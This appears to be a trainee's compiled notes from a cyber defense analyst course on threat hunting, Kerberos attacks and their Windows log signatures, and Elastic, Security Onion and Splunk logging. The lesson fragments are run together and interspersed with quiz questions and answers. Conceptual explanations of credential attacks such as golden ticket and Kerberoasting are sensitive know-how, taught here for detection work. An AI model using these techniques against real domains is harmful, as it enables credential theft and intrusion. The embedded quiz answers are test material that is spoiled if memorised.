CTH Methodologies The NIWDC defines 3 separate CTH methodologies:

Analytics-driven

Situational awareness-driven

Intelligence-driven

Analytics-Driven ﻿ The analytics-driven methodology leverages data and analytics. This methodology applies complex queries and algorithms to data sets, often using software automation. A key distinction with the analytics methodology is that it does not require physical access to local machines, networks, or systems. CTH analysts using the analytics-driven methodology gather data artifacts consisting of sensor alerts, system logs, and network traffic. Combining knowledge of data artifacts with knowledge of automated analysis capabilities allows the analysts to develop a picture of the network terrain.

Situational Awareness-Driven

The situational awareness-driven methodology leverages an advanced understanding of a particular cyberspace terrain to detect anomalous activity. Similar to the analytics methodology, situational awareness does not require physical access to local systems. Data artifacts pertaining to the operating environment are critical to this methodology. CTH analysts examine data artifacts over time in order to understand system normality and detect outliers in behavior. This often leads to discovering potential MCA.

Intelligence-Driven ﻿ The intelligence-driven methodology leverages timely, accurate, mature Cyberspace Threat Intelligence (CTI) to detect advanced cyberspace threats. The intelligence-driven methodology requires physical access to local systems.

The remaining sections of this lesson focus on the intelligence-driven CTH methodology.

TTPs ﻿ As defined by National Institute of Standards and Technology (NIST), “tactics are high-level descriptions of behavior, techniques are detailed descriptions of behavior in the context of a tactic, and procedures are even lower-level, highly detailed descriptions in the context of a technique.”

TTPs are a chain, or sequence, of actions taken by the adversary during their actions or campaign. There is a wide variety of TTPs, however, some common TTPs include using a specific malware variant, attack tool, delivery mechanism (such as phishing), or exploit.

As diagrammed in David Bianco’s Pyramid of Pain in Figure 1.1-9, below, TTPs are located at the top of the pyramid. According to Bianco, “at the apex are the TTPs. When you detect and respond at this level, you are operating directly on adversary behaviors, not against their tools.”

IOCs can include hash values, IP addresses, domain names, and network/host artifacts. All of these items are located below TTPs on the pyramid.

Attack Behaviors and Hunting The analysis of FireEye’s APT37 intelligence report identified multiple TTPs. Below are just three TTPs from the report, as well as the attack behaviors they each translate to:

Spear-phishing. Adversaries may send emails with a malicious link in an attempt to gain access to victim systems. The email employs links to download malware contained in the email to avoid defenses that may inspect email attachments.

Malicious documents. An adversary may rely upon a user opening a file in order to gain execution. Users may be subjected to social engineering to get them to open a file that leads to code execution.

Command and Control. Adversaries may use an exploited host to communicate with systems under their control within a victim network. Translating TTPs into attack behaviors helps narrow the focus of a hunt mission. Each TTP and behavior has specific attributes and components related exclusively to them. These attributes and components may take the form of a piece of software, a type of communication, a type of log file, or an event ID, all of which can be used within a hunt mission.

IOCs and TTPs Step 5 of the OP, Tactical Planning and Mission Execution, includes threat intelligence. Threat intelligence typically includes artifacts and evidence found within the operating environment (OE). A threat intelligence report typically includes IOCs and TTPs pertaining to either the network, the threat, or both.

IOCs ﻿ As defined by the CWP an IOC is, “a forensic artifact observed on a computer network or in a computer operating system which indicates an intrusion.” IOCs change and can take on a wide variety of topics and forms. Some common IOCs include the following:

Unexpected network traffic (inbound or outbound)

Unusual internet protocol (IP) addresses

Connections to strange geographic areas

Increased activity by a privileged user

Increased volume of data transmission

Below is a sample intelligence report from a hunt mission. The intelligence report includes specific IOCs and supporting details.

Intel Flash: MistyIguana Group Tied to Recent Attacks on Pharmaceutical Companies﻿

A recent intelligence report published by public-sector cybersecurity company Frostgaze has tied several network artifacts used in an attack campaign against pharmaceutical company Draxx, Inc. back to the MistyIguana threat group. The Frostgaze intelligence report released the following network-based IOCs to the public.

The above intelligence report triggers a CPT hunt operation for related MistyIguana activity on the network of Alabaster Corp, a DoD-affiliated contractor. Alabaster Corp is working on a DoD-critical project, and MistyIguana has been known to target defense-related networks in the past.

After receiving intel, the CPT must follow the steps below:

Terrain Identification and Prioritization

Tactical Planning Inputs

Creating the Tactical Plan

Executing Hunts

Hunt Execution Outputs

Intel-Driven Hunting Cyber Threat Intelligence Overview ﻿ Analysts using the intelligence-driven methodology leverage CTI. CTI is information that has been analyzed to aid an organization in identifying, assessing, monitoring, and responding to cyber threats. Organizations generally produce various types of CTI, which they can share internally for CTH. Information may also be derived externally, from outside of the organization. Examples of CTI include:

Indicators (system artifacts or observables associated with an attack)

TTPs

Security alerts

Threat intelligence reports

Recommended security tool configurations

CTI can trigger a hunt operation by warning of an imminent or already-realized cyber attack, or by reporting on new indicators or adversaries that were recently seen in the wild. For example, intelligence about an adversary beginning to actively target the energy sector may trigger a CPT to perform hunts for evidence of that adversary on energy sector networks. CTI can also inform the Tactical Planning and Mission Execution phase of a hunting operation by allowing an analyst to develop more informed or more targeted hunting hypotheses. An upcoming lesson in this course discusses the features of hunt hypotheses.

Types of CTI ﻿ Organizations develop different types of CTI, depending on who is receiving the information and what details it includes. The three categories of CTI include the following:

Strategic. Broad, general information that provides high-level threats and activities in a non-technical delivery.

Tactical. TTP outlines for a technical delivery that explains how the adversary may attempt to attack the network.

Operational. Purely technical information about specific attacks, experiences, or campaigns that provides actionable information regarding activities that have been previously identified.

CTI Sources

CTI is derived from both internal and external sources. Internal refers to CTI collected from within the network or organization where the hunt operation is occurring. Internal CTI typically includes artifacts such as network event logs, IP Addresses, or records of past incident responses. External CTI refers to CTI collected from sources outside of (or "external" to) the network or organization where the hunt operation is occurring. External CTI typically includes artifacts such as those found on the open internet or technical sources (such as MITRE ATT&CK). A key benefit of external CTI is that organizations can leverage the collective knowledge, experience, and capabilities from the community to gain a more complete understanding of the threats the organization may face.

Cyber Threat Hunting The Naval Information Warfighting Development Center (NIWDC) defines Cyber Threat Hunting (CTH) in the following way:

“A specialized and detailed scrutiny of friendly cyberspace for threats that have breached security and are difficult for routine detection measures to discover and is aligned to defensive cyberspace operation-internal defensive measures (DCO-IDM).”

Simply, CTH is the process of actively searching information systems to identify and stop malicious cyberspace activity. The term “hunting” refers only to internal defensive measures that require maneuver within the defended network to identify, locate, and eradicate an advanced, persistent threat. A primary component of threat hunting is based on detecting TTPs.

CTH operations are centered around analysis and review of the compromised network. Analysis and review involve searching and auditing the endpoint activities a threat actor executes to avoid detection.

CTH Kill Chain ﻿ Figure 1.1-8, below, illustrates the 5 stages of the CTH kill chain as NIWDC defines it:

The Start. Search for MCA by filtering out legitimate or expected activity on the network.

Refinement. Find suspicious activity. This triggers a deeper investigation and increases search efforts.

Discovery. Discover the root cause of the malicious behavior.

Response. Calculate and assess the attack. Remediate the threat based on this information.

Continuous Improvement. Update defenses to prevent future attacks that use the same TTPs discovered during the hunt.

What is NOT CTH? ﻿ Misconceptions of what CTH comprises make it difficult to understand its value and intent. Timing and approach are what differentiate CTH from other defensive activities.

CTH starts before any threat has been found. On the other hand, practices such as incident forensics or incident response occur after identifying an incident or compromise. The aim of CTH is to illuminate an adversary before a known incident. This requires analyzing the current environment and its conditions to identify any evidence of intrusion or compromise before any are known to exist.

CTH is also different than simply installing tools and waiting for alerts. While CTH does require technology and data, these tools are used for proactive discovery. Analysts leverage the information they gather to discover known adversary TTPs that validate whether adversary activities are imminent or ongoing.

What step in the operations process does the development of a hunt hypothesis fall under? tactical planning and mission execution

event.code:1 and process.command_line.keyword~ localgroup event.code:(4728 or 4732 or 4746 or 4751 or 4756 or 4761) log on

The following list is an example of tactical KT-C for an APT that is performing data theft in a network: A list of servers that contains the targeted information A list of systems that attackers may use to pivot into the system A subset of users that have access to the targeted information Once the tactical KT-C is determined, generating the hunt hypothesis is straightforward. Start with the hypothesis that the attackers have direct access to the servers, as described below:

Hypothesis: Malware is exfiltrating sensitive data to the internet from at least one of the servers responsible for storage of that data.

Based on the KT-C, this hypothesis only makes sense if the servers reach out directly to the internet. If there are robust logs on the network connections of these systems, finding a unique IP address or domain is relatively straightforward.

There is a lot of room for creative solutions to these cyberspace problems. For example, a unique callback domain name is going to be a largely unpopular domain. Using a list like "Cloudflare Radar" (top most popular domains) would remove likely legitimate websites.

Hypothesis: The attackers are accessing sensitive data from servers by pivoting from systems defined in the tactical KT-C.

Going through the logs to test this hypothesis provides a few obvious forensic artifacts. These include odd times the system connects to the server, new or unusual login locations, or credentials used by scripts running interactively.

Hypothesis: The attackers are using compromised credentials to access sensitive information.

With proper analysis, the KT-C identified is a subset of users that includes only accounts with permissions to access the targeted data. Looking for anomalous user activity from within that subset is a good way to see if there are compromised accounts. A user is logging into the server from a different workstation than they normally use. Credentials are used to access files, but have not been used to log into a workstation. "Bursty" network traffic where files are downloaded methodically over a short period of time. Another detection method to this, although highly impractical, is what if everyone in the organization was told verbally not to authenticate to the server, with no digital trail would the attackers think they are going to keep blending in?

Which internal target would be useful for pivoting into an FTP server that hosts sensitive data? a user workstation that normally communicates with the ftp server

Which types of access are useful to an APT that steals sensitive data?

user with sensitve data user access to internal host without sensitve data root access to a core piece of networking hardware

kt-c KT-C Review

The Cyber Defense Analyst-Basic course provides a lesson on KT-C that focuses on strategic level terrain. This lesson focuses on tactical level terrain and illustrates how understanding attackers' goals facilitates the identification of these hosts and reduces the initial search area. Below is a summary identifying KT-C from the lesson Terrain Identification, in the Cyber Defense Analyst-Basic course.

Tactical Level Terrain Features that provide the offensive operator an advantage today.

Operational Level Terrain Features that provide the adversary an advantage over a series of activities and fulfill the overall objectives of their cyber campaign.

Strategic Level Terrain Three elements in the "triad of security" rate the impact of the various parts of the system. Availability Integrity Confidentiality

Three tiers of key terrain. Tier - 1: Top value, critical and essential data, applications, critical network services, and information processing Tier - 2: Important data and applications Tier - 3: General data and applications

Kerberos Attacks and Logging Kerberos Attacks ﻿

Authentication mechanisms are sometimes the only thing preventing an attacker from getting their desired data. This makes any vulnerabilities in the protocol highly sought-after. The most likely attack a defender sees in a network is Kerberoasting. The next most likely attack is overpass-the-hash, followed by the golden ticket. The silver ticket and bronze bit exploits are patched and Authentication Service Response (AS_REP) Roasting requires a user to intentionally disable pre-authentication.

﻿

Pre-Authentication Brute Force ﻿

Pre-authentication brute-forcing is simply just guessing a user's password. Pre-authentication is enabled by default within windows domains and it requires the user's password to be used to encrypt the current time when requesting a TGT. Without this function, any user can request a TGT for any other user, which makes cracking a user's password possible. This attack is referred to as AS-REP roasting, which is explained in more detail, below.

﻿

AS_REP Roasting ﻿

In AS_REP roasting, without pre-authentication, there is no authentication on requesting a TGT, which includes data encrypted by the user's password. This allows a malicious user to request a TGT for a different user and then try to crack the password.

﻿

Kerberoasting ﻿

Kerberoasting is similar to AS_REP roasting. Kerberoasting requests a TGS for an AP and tries to crack the password. Service accounts have high-complexity passwords that change frequently, however, if a user account is in charge of the service then it might be crackable.

﻿

Overpass-the-hash ﻿

Attackers conduct an overpass-the-hash attack when they use a stolen password hash to request a TGT. This works with Single Sign On (SSO), since users are not repeatedly prompted for a password. Authentication methods, like Kerberos, authenticate someone based on the encrypted version of the password (the hash) and do not require the clear-text version of the credentials.

﻿

Golden Ticket ﻿

The account named krbtgt on the DC is the account that owns the master, trusted keys. It is shorthand for Kerberos TGT, where krb stands for Kerberos. If an attacker steals krbtgt credentials from the DC, they can make any TGT. Attackers can set the expiration date far into the future, allowing persistent access into the network. This exploit is really just how Kerberos works. At some point something has to be trusted and if the attackers have access to the trusted keys there is not much of a defense against that.

﻿

Windows stores the current and last krbtgt account passwords and keeps them valid. That means if there is a golden ticket available, the krbtgt account will need to be changed twice before it becomes invalid. This invalidates every TGT in the network, forcing all accounts to re-authenticate.

﻿

Silver Ticket (CVE-2014-6324) ﻿

The Silver Ticket attack is a PAC that is maliciously modified. It allows the attackers to escalate privileges of any account to be domain administrators.

﻿

Kerberos has two distinct steps: authenticating the user and checking privileges. Windows implementation of Kerberos blends these two steps. The user's permissions only come into play when the user requests access to a network resource and has nothing to do with the authentication step. In Windows networks, the authentication step returns a PAC which contains the user's permissions. Later on, the PAC is presented to the application server as proof of the user's permissions, which should be secure, since it is signed by the account on the DC.

﻿

This exploit, which was patched in 2014 (MS 14-068), allowed an attacker to fabricate a PAC that would pass verification due to a logic flaw. Microsoft allowed hashing algorithms that did not require keys, so any valid checksum was treated the same as a checksum that required access to the DC's private key. This means any account could be elevated to domain admin without having to communicate to the DC.

﻿

Bronze Bit (CVE-2020-17049) ﻿

The Bronze Bit attack made it possible to have the service impersonate any user outside the scope of the configured service. This occurred after stealing a hash for an AP service that was configured to allow delegation or forwarding credentials of the user to other services. Delegation is supposed to be limited, however, the flag that denotes a TGT as being limited is protected by the service's hash. This means the service could decrypt that part of the message and flip the bit to make that limited scope TGT to be a TGT that grants full access to the user's account.

﻿

Logging examples ﻿

Pre-Authentication Brute Force Logs ﻿

The process of brute-forcing these accounts leaves some forensic residue in the logs. These authentication failures are not logged with a normal event ID 4625: An account failed to log on. Instead, they produce an event ID 4771 which is only on the DC. This event ID is described below:

﻿

Event ID: 4771, Kerberos pre-authentication failed﻿

Result Code: 0x18 KDC_ERR_PREAUTH_FAILED Bad password Result Code: 0x6 KDC_ERR_C_PRINCIPAL_UNKNOWN Kerberos produces an error if the username is incorrect. Attackers can leverage this to guess usernames. Defenders should monitor the following with this event log and attack:

High-value accounts, such as domain admins Off-hours logs Inactive accounts Client Address field is outside the internal range Large volume of logs Incorrect pre-authentication type for the network If only smartcards are allowed within the network (pre-authentication type 15) and the 4771 log shows a failure with pre-authentication type 2, then something is trying to use a password. ﻿

Golden Ticket Logs ﻿

Logging associated with a Golden Ticket is an exploit technique, but not directly due to a flaw in Kerberos. The tools executing this attack do not work exactly the same way that the native windows systems work. This creates anomalies within the logging. Below is a snapshot of the event logs associated with this attack and some notable features. The main point of this data is that hacking tools tend to leave odd entries within logs that will be inconsistent with how the legitimate system tools create logs.

﻿

Event ID: 4769, A Kerberos service ticket was requested﻿

Location: Domain controller Notable activity is a TGS being requested without a preceding TGT Event ID: 4627, Group membership information﻿

Location: workstation/Domain controller Event ID: 4624, An account was successfully logged on﻿

Location: workstation/Domain controller Field: Account Domain may be the Fully Qualified Domain Name (FQDN) when it normally is the short domain name Field: IpAddress may indicate the compromised host Event ID: 4672, Admin Logon﻿

Location: workstation Field: Account Domain may be blank when it normally is the short domain name Event ID: 4634, Account Logoff﻿

Location: workstation Field: Account Domain may be blank when it normally is the short domain name

og Aggregation and Parsing Fundamentals Adversaries go to great lengths to remain undetected. A successful attack often hides among other traffic and activity in order to seem less conspicuous. For example, as systems log outgoing traffic, an attacker may try to exfiltrate data to a compromised trusted external cloud asset or move data using a trusted compromised system service. The ability to identify irregularities within normal log data is critical for defenders to be able to recognize abnormal and potentially malicious traffic. This also reduces hunt time lost in chasing down false positives.

﻿

Many Operating Systems (OS) and security applications have advanced logging capabilities that are usually disabled by default. Verbose security logs may contain valuable information, but lead to security personnel missing critical data and system resources becoming quickly overwhelmed with too much logging. This is why knowing what to log, when to log it, and how to interpret log details is fundamental for proper aggregation and parsing. There are four key platforms that provide logs:

Windows Unix Applications Network Defense Windows Logging Capabilities ﻿

Windows logs are a great way to view application-agnostic logs that indicate different security events, system failures, and abnormal behaviors. The three main types of Windows logs that organizations most commonly aggregate include the following:

System Security Application Windows generates system events, which correspond to driver updates, power faults, and other system-level occurrences. Security events relate to logins, share access, and file creation/deletion. Application events are specific to each program installed on the host. The program developer dictates what their application reports to the event log. Some applications do not report to the event log, but, instead, write logs directly to a text file within their application directories.

﻿

Unix Logging Capabilities ﻿

Unix-based OS logs are different from Windows logs in how they’re generated and what they represent. The first time that an application sends logs to the syslog daemon, it creates an entry in /etc/syslog.conf, which lists the file paths for specific logs.

﻿

Most Unix distributions place logs into the following categories, or “facilities”: auth, console, cron, daemon, ftp, kern, local*, lpr, mail, news, ntp, user, uucp, syslog, boot, dmesg, faillog, application (httpd, samba, mysql, etc.) and linux systemd journals.

﻿

Unix application developers often allow administrators to configure the amount of information sent to each facility on a scale of 1 to 9. For example, an ftp connection failure might be categorized as a priority 1, meaning it is always logged. A file transfer may have a priority 9, meaning it is never logged. Users may change severities and elect to completely omit logging any logs that are below a certain priority. This measure helps prevent excessive logging, in which logs meet the host’s rotation threshold and get deleted. Deletion occurs if the log directory grows too large or too old.

﻿

Application Logging Capabilities ﻿

User applications usually also have logging capabilities for various events. Some applications offer very verbose and in-depth logging options, while others offer very little. Most application vendors offer documentation on what logs their software generates and how to find relevant information within those logs.

﻿

Network Defense System Logs ﻿

Firewalls, Intrusion Detection Systems (IDS), Intrusion Prevention Systems (IPS), routers, and other networking devices all contain different kinds of logs based on the traffic that they process. Networking equipment logs can be configured to perform full packet captures. This is when the entirety of the network packets that they process are logged and categorized based on the packet metadata.

﻿

For example, Cisco devices have methods for sending all their logs to a log server so that personnel do not have to manually check the device’s logs. The two most common types of log forwarding are Syslog forwarding and Simple Network Management Protocol (SNMP) trap logging. Syslog forwarding sends all configured device logs to a remote syslog server, while SNMP traps allow CDAs to find changes to both configurations and configured devices.

﻿Data Aggregation Systems and Limitations Threat hunting and information gathering usually begin by parsing important OS logs from servers and other critical infrastructure devices such as Domain Controllers (DC), Dynamic Host Configuration Protocol (DHCP) servers, Simple Mail Transfer Protocol (SMTP) servers, and other services. Organizations forward these logs to a log aggregator, which makes it easy to query all logs from a single repository. The following are common logging types and data aggregators for log management:

Syslog forwarding

Windows event forwarding

Third-party Security Information and Event Management (SIEM) applications

Syslog Forwarding ﻿

As a standard, the intention for syslog is for its messages to be sent to a syslog aggregator such as Splunk or Elastic. These aggregators normalize logs for easy human consumption. Typically, any host that uses syslogs has the ability to forward logs to a remote host. Aggregators have a dedicated syslog ingestion port and service for managing the intake of the logs. CDAs can use aggregators to view logs for a hunt.

﻿

Windows Event Forwarding ﻿

Windows provides the Windows Event Forwarding (WEF) service to collect and aggregate logs from Windows hosts. IT administrators likely know how to configure log forwarding and create a subscription between source collectors and the log forwarder. However, threat hunters may also need a greater understanding of whether the Group Policy Object (GPO) has been configured to forward logs to the organization’s chosen log management system, log aggregator, or SIEM. A GPO for DC forward logs is available by navigating through the following sequence of settings:

Computer Configuration

Policies

Administrative Templates

Windows Components

Event Forwarding

A configured GPO has all managed devices forwarding logs to the server. Figure 1.4-1, below, displays this GPO configuration:

﻿

﻿

Figure 1.4-1﻿

﻿

Forwarding the entirety of a system’s logs across a network may congest aggregators or overwhelm analytic resources. This also generates a large amount of traffic. Windows Event Viewer has a subscriptions section to choose the log sources to forward, but users must implement this feature carefully. Users must determine how to balance the needs for logging with the additional resources that analyzing large data sets requires.

﻿

Third-Party SIEM Applications ﻿

SIEM applications all have different logging capabilities, but some of the most common ones that an analyst is likely to use include the following:

Solarwinds

Datadog

Splunk

McAfee ESM

Micro Focus ArcSight

Elastic Stack

Each of these applications uses different methods to aggregate, index, and analyze data events. They also have the ability to use the same source log files.

﻿

Common Data Logging Standards ﻿

It is useful for threat hunters to understand the standards with which an organization must comply because it helps identify what information is being logged before beginning threat hunting. The standards by the United States government organizations are especially informative. This includes the National Institute of Standards and Technology (NIST) publication 800-137 Information Security Continuous Monitoring (ISCM). This publication defines processes for monitoring Information Technology (IT) systems and balancing operational risk to technical vulnerabilities.

﻿

Common Issues with Over-Logging ﻿

Excessive logging creates complications in both technical and practical respects. Many SIEM applications archive or delete logs over a certain storage limit, which can lead to losing logs required for an investigation. Likewise, packet captures of encrypted traffic can be logged, but offer little information due to their obfuscated nature. Excessive logging congests the network and system resources of log storage servers. The data storage for constant, verbose logging is both costly and requires additional physical equipment space. Lastly, some SIEM vendors charge customers based on the amount of stored, ingested, or index log events, which can cause logs to be rejected and not collected. Subscriptions prices may also change dramatically, based on use.

ATT&CK Matrix Logging Strategy There is a cost to logging everything and a cost to logging nothing. The appropriate strategy is to configure logging based on common indicators of compromise. The Background Intelligent Transfer Service (BITS) tool discussed in previous lessons provides an example of this.

﻿

In Windows, many threat actors attempt to remove evidence of their intrusion with the BITSAdmin tool. Defenders can check the BITS service by running sc query bits. They can also see active BITS tasks with the command bitsadmin /list /allusers /verbose. MITRE® recommends searching the System logs, PowerShell logs, and Windows Event log for activity related to BITS, if an intrusion is suspected. The BITS related events IDs are:

Event ID 3: information about the job creation Event ID 59: information about the start of the service: "BytesTransferred" value is zero Event ID 60: status of the job Event ID 4: completion of the job: "BytesTransferred" value is the size of the downloaded file MITRE provides a data sources page that is a fantastic resource for finding common valuable log sources for threat detection, especially in relation to an ongoing hunt. The link is available below.

Data Parsing There are different ways for aggregated data from multiple sources to convey the same information. Parsing is the process of normalizing, or splitting unstructured logs, into common attributes with common reference points, such as time.

﻿

Parsing is required because different systems log the same types of data in different ways. There may be variations in the format of the event fields or timestamps of the systems logging those events. Handling timestamps is not a trivial task in computer science.

﻿

There are many ways to display and store timestamps. This includes counting the number of seconds since January 1, 1970. Another option is a signed 32-bit integer that represents time as yymmddHHMM. Tools such as syslog omit the year, while additional tools have ambiguous dates due to regional differences in how date references. For example, dates are written in day-month-year order rather than month-day-year. Parsing takes these various attributes and translates them into a common format.

﻿

Many networks that a CDA analyzes contain different tools. Understanding the general scope of what is being collected is more valuable than understanding the specific usage of one tool. The next topic in this lesson covers log data queries that are general enough to apply to any platform. However, as tools change and evolve, a CDA should familiarize themselves with any new log parsing tools they encounter in the field.

﻿(trainee@dmss-kali)-[~/Desktop/dirwalk] $ python3 parser.py -w -i dirwalk_1.txt -o dirwalk_1.csv

Modify the object windows_parser_definitions_2 in parser.py to conform to the file dirwalk_2.txt and enter the following command to parse the directory walk: (trainee@dmss-kali)-[~/Desktop/dirwalk] $ python3 parser.py -x -i dirwalk_2.txt -o dirwalk_2.csv
The script  analyzer.py  has the following options to analyze the output of the script  parser.py : -i, -input_data file — input CSV file to analyze -m, -lastDay — files modified in the last day -b, -knownBad — files that match known a regular expression of "bad" strings -p, -images — files with extensions matching a list of image file types Use the script analyzer.py to analyze dirwalk_1.csv and dirwalk_2.csv and answer the following questions. The following is an example of the input you may use: python3 analyzer.py -i dirwalk_1.csv -p

Which technique is NOT detected by the current data sources?

Step 1: Data Sources

In the first step of the process, analysts describe and score all sources of data. Data sources can be raw logs or events generated by security appliances or systems in a mission partner environment. The descriptions of the data sources that are available to an organization’s security team and their quality are consolidated in user-defined YAML files. The DeTT&CT tool and ATT&CK framework both recognize over 30 different data sources, which are divided into more than 90 data components. These components describe particular properties or values of each data source. Each TTP’s dedicated MITRE ATT&CK page lists the data sources that provide visibility to the specified TTP, under the Detection section of the page.

For example, analyzing the following data sources can help detect the technique T1003 Operating System (OS) Credential Dumping: DS0026 Active Directory DS0017 Command DS0022 File DS0029 Network Traffic DS0009 Process DS0024 Windows Registry

Tools and Data Flow

Elastic Stack

Elastic Stack is a log management platform built on a collection of open-source tools with various functionalities. Elastic Stack tools enable monitoring of diverse and distributed applications and Information Technology (IT) devices. The components of Elastic Stack include the following: Beats Logstash Elasticsearch Kibana

Security Onion

The components of the Elastic Stack are frequently configured to work within another popular tool, Security Onion. Security Onion is a free and open Linux distribution for threat hunting, enterprise security monitoring, and log management. Security Onion is produced by a different organization than Elastic, so although these tools are often used together, Security Onion is not officially part of the Elastic Stack. Security Onion supports Elastic and its tools by providing a log management platform with nodes. Security Onion offers full packet capture for both network-based and host-based Intrusion Detection Systems (IDS). Security Onion also includes functionality to index, search, and visualize large amounts of data. The Elastic Stack has become a central element in recent versions of the Security Onion Linux distribution.

Data Flow

Figure 2.1-1, below, illustrates the flow of data through the Elastic Stack components and Security Onion. Elastic beats collect data to send to Logstash, which aggregates and processes that data. The data is then sent to ElasticSearch for indexing and storage. Security Onion nodes supply additional resources to support network data aggregation and alerts on suspicious activity. Kibana is used to view this information in a human-readable format. Each of these tools is described in greater detail, below.

Figure 2.1-1

Elastic Stack Components Beats

Beats are agents that gather data such as Windows event logs. Beat agents are deployed on servers and hosts and centralize the data in Elasticsearch. Beats ship data that conforms with the Elastic Common Schema (ECS). ECS is an open-source specification that is developed with support from the Elastic user community. ECS defines a common set of fields to use when storing event data in Elasticsearch, such as logs and metrics. ECS specifies field names and Elasticsearch data types for each field and provides descriptions. If the data fits into the ECS, users can directly import it into Elasticsearch. Otherwise, the data has to be forwarded to Logstash.

Table 2.1-1, below, lists the types of beats that Elastic supports. This lesson covers the use of two of these beats: Winlogbeat and Packetbeat.

Table 2.1-1

Logstash

Logstash ingests, transforms, and ships data, regardless of format or complexity. Data is often scattered or distributed across many systems, in many formats. Logstash supports a variety of inputs that synchronously pull events from a multitude of common sources.

Logstash allows custom filters and pipelines to help users ingest data of different formats and schema. This customization means that a user can write a filter to parse and index the data however they want, regardless of the log, the data input structure, or the fields included in the data. The type of log file and collection location determines the ingestion path into Security Onion and Elasticsearch. The ingestion paths are composed of Security Onion nodes that handle specific data types and are responsible for sending that data type to Security Onion and Elasticsearch. The ingestion path can contain multiple nodes, however, the most common nodes are the manager, manager search, and forward nodes, as described below.

Manager

The manager node runs Security Onion Console (SOC) and Kibana. It has its own local instance of Elasticsearch that handles central configuration. An analyst connects to the manager node from a client workstation to execute queries and retrieve data. A dedicated manager node often requires separate search nodes for large networks. The manager node supports the following components: SOC Elasticsearch Logstash Kibana Curator ElastAlert Redis Wazuh

Manager Search

A manager search node is both a manager node and a search node together. It has higher hardware requirements than a normal manager node since it parses, indexes, and searches data. A manager search node supports components such as the following: SOC Elasticsearch Logstash Kibana Curator ElastAlert

Forward

A forward node is a sensor that forwards all logs through Filebeat to Logstash on the manager node. Filebeat is a lightweight shipper for forwarding and centralizing log server data. They are stored in Elasticsearch on either the manager or manager search node. Forward nodes run the following components: Zeek Suricata Stenographer Wazuh

The type of data and data collection location decides where the data is sent. Zeek logs, which handle network traffic, are collected at the Forward node, where they are sent through Filebeat to Logstash, located on either the Manager or manager search node. Winlogbeat logs, which handle host logs, are forwarded to the Management or Manager Search node directly through Logstash.

Elasticsearch

Elasticsearch is an open-source, distributed search engine based in JavaScript Object Notation (JSON). It is often referred to as a Non-Structured Query Language (NoSQL) or document-oriented database since it does not require a user to specify a schema upfront. Elasticsearch functions as a data housing and maintenance location. Elasticsearch stores, searches, and analyzes large volumes of data in near real-time and provides answers in milliseconds.

Kibana

Kibana is a frontend application that is the end-user, Graphic User Interface (GUI) component of the Elastic Stack. It provides search and data visualization capabilities for data indexed in Elasticsearch. Kibana queries the data residing in Elasticsearch and searches across all documents to create visualizations and dashboards.

Sigmac Syntax Sigmac uses the following syntax to translate a query in Elastic syntax using the Winlogbeat configuration:

python sigmac -t <path to file/rule> -c ﻿

This syntax uses the following elements:

Translate (-t) Configuration (-c) ﻿ Sigmac Syntax Sigmac uses the following syntax to translate a query in Elastic syntax using the Winlogbeat configuration:

How does Elastic Stack aggregate data? an agent such as packetbeat or winlog is deployed on hosts to collect specfic types of data

What was the purpose of modifying the configuration file to include Logstash output at 172.35.1.38:5044? send collected data to the logstash for parsing and indexing

Besides Elasticsearch, what are the other components that make up the Elastic Stack? beats, kibana, logstash

Infrastructure and Data Flow Splunk offers various types of deployments, such as Splunk Cloud and Splunk Enterprise Security. However, each deployment is built on similar principles and architecture. This lesson uses a generic Splunk Enterprise deployment to introduce these underlying concepts, starting with critical Splunk infrastructures and their processes.

﻿

Instance Data Flow ﻿

Three main components make up a full Splunk deployment: the forwarder, the indexer, and the search head. Combining these components and deploying them together create a Splunk instance. Figure 2.2-1, below, visualizes the flow of data through a Splunk instance. This data flow occurs in two parts. Part 1 ingests raw data with a forwarder, then sends the data to an indexer to parse into events and store within indexes. Part 2 searches for data by using a search head to parse search queries, create search jobs, and distribute the jobs to indexers. The indexers process the search jobs and return the results to the search head for post-processing. Each component and its functions are described in greater detail, below.

﻿

﻿

﻿

Figure 2.2-1﻿

﻿

Forwarder ﻿

Part 1 of the data flow starts with a forwarder. A forwarder collects data from a source and sends that data to either another forwarder or indexer. The two types of forwarders are universal forwarders and heavy forwarders.

﻿

A universal forwarder is a lightweight tool that performs limited forwarding functionality. It is not capable of acting as a full instance of Splunk. This type of forwarder simply collects raw data from a source and sends that raw data to a destination.

﻿

A heavy forwarder has more capabilities than a universal forwarder. These additional capabilities include pre-processing and routing data to different destinations based on defined conditions. A heavy forwarder commonly forwards data directly to indexers, rather than to other forwarders. due to its extra processing ability. A heavy forwarder can act as a full instance of Splunk.

﻿

A network’s Splunk administrator is responsible for administrating Splunk instances. Additional information about these instances is available in the upcoming Splunk Instances section of this lesson.

﻿

Indexer ﻿

Indexers have important positions in both parts 1 and 2 of the data flow. An indexer handles data processing and storage. It does this by parsing raw data and transforming it into events. These events are then stored in an index located on the indexer. Multiple indexes can exist on a single indexer.

﻿

Advanced Splunk deployments also allow multiple indexers. Usually, these indexers handle data from different sources. Advanced deployments may set up multiple indexers to act as a cluster. Clustered indexers receive and replicate the same data across each indexer in the cluster. This can increase the performance of the Splunk deployment and act as protection against data loss.

﻿

Search Head ﻿

Part 2 of the data flow starts with users submitting search queries to a search head. A search head is responsible for parsing search queries into search jobs and distributing those search jobs to indexers. These queries are written in the Splunk Search Processing Language (SPL). Indexers process a search job against the indexes stored within that indexer and return the results of the search job back to the search head. The search head performs any necessary post-processing of the results before making the results available to the interface that queried the search head. Interfaces are discussed briefly in the upcoming section about Splunk instances.

Key Splunk Terms This section provides a refresher on common terms for working with Splunk. The first set of terms describes how data is stored and organized, while the second set of terms describes useful tools for processing data.

﻿

Data Organization ﻿

Common terms for storing and organizing data include the following:

Index

Events

Fields

Sourcetype

Index ﻿

After an indexer is done parsing raw data into individual events, Splunk stores these events in an index. An index is the data repository for a Splunk instance. Events located within an index are written to that instance’s disk. Events stored in an index are searchable by a search head.

﻿

Many different indexes may exist within a single Splunk deployment. New indexes can be created by modifying configuration options on the indexer.

﻿

Events ﻿

Events contain event data and additional metadata about the event. Event data consists of formatted fields that the indexer extracts from the raw data. Event metadata includes, but is not limited to, the following:

Host: The device that generates the event.

Source: Where the event originates, such as a data file.

Sourcetype: Sourcetypes determine how incoming data is formatted.

Event metadata is stored in the default fields of an event. These default fields are shared between all events within an index and are usually great places to start a search query.

﻿

Fields ﻿

A field is a searchable name-value pair within data. For example, a field named ComputerName may contain the machine name of the computer on which a particular event occurred. Fields are the building blocks of searches within Splunk.

﻿

Sourcetype ﻿

